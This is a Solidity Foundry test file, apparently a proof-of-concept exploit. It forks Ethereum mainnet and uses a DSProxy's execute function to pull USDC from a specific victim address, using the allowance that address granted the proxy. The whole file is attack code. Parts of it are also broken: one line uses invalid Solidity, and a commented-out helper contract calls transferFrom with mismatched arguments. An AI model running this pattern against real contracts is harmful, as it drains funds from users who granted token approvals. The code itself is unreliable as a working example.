// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import {console, Test} from "forge-std/Test.sol";

interface IDSProxy {
    function execute(bytes memory _code, bytes memory _data) external payable;
}

contract MulticallTest is Test {

  IDSProxy DSProxy = IDSProxy(0xe6dC6971882062FCa1255A6836EA84fe5210853c);
  address private vic = 0x63DF7d9D7795883d56cA290f94aba8a6AA4F6f22;
  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

//   Caller mcaller;

  function setUp() public {
      vm.createSelectFork("https://rpc.ankr.com/eth", 20771178);
    //   mcaller = new Caller();
  }

  function testExploit() public {

      uint256 allowance = usdc.allowance(vic, address(DSProxy));
      uint256 balance = usdc.balanceOf(vic);
      uint256 amountToTransfer = balance < allowance ? balance : allowance;

      bytes memory Data = abi.encodeWithSelector(
          bytes4(keccak256("transferFrom(address,address,uint256)")),
          vic,
          address(this),
          amountToTransfer
      );

      // Fix: Convert the `Caller` contract to its address
      bytes memory callerCode = abi.encodePacked(type(address(usdc)).creationCode);

      IDSProxy(DSProxy).execute(callerCode, Data);
  }
}

// contract Caller {

//   function setUp() public {}

//   function transferFrom(
//       address sender,
//       address target,
//       uint256 amount
//   ) external {
//       require(transferFrom(target, amount), "TransferFrom failed");
//   }
// }
